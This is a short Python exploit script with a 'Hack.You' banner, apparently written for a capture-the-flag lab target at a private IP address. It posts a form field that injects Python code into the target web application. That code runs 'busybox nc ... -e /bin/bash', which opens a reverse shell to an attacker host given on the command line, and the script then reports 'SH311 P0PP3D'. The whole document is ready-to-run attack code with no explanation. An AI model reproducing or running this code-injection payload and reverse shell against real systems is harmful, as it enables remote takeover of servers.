#!/usr/bin/python3
# Author: Hack.You
import requests
import sys
from termcolor import colored

print(colored('''

 _   _ _  _    ____ _  __ __   _____  _   _
| | | | || |  / ___| |/ / \ \ / / _ \| | | |
| |_| | || |_| |   | ' /   \ V / | | | | | |
|  _  |__   _| |___| . \    | || |_| | |_| |
|_| |_|  |_|  \____|_|\_\   |_| \___/ \___/

''' , 'red'))

url = 'http://10.10.85.206:5000/'
host = sys.argv[1]
port = sys.argv[2]
shell = f'__import__("os").system("busybox nc {host} {port} -e /bin/bash")'
data = f'xa={shell}&xb=1'
proxy = {'http':'http://127.0.0.1:8080'}
headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'PwnerZ',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
}

try:
   post = requests.post(url, proxies=proxy, data=data, headers=headers)
   print(colored('SH311 P0PP3D', 'blue'))
except Exception as e:
   print(f"An error occurred: {e}")
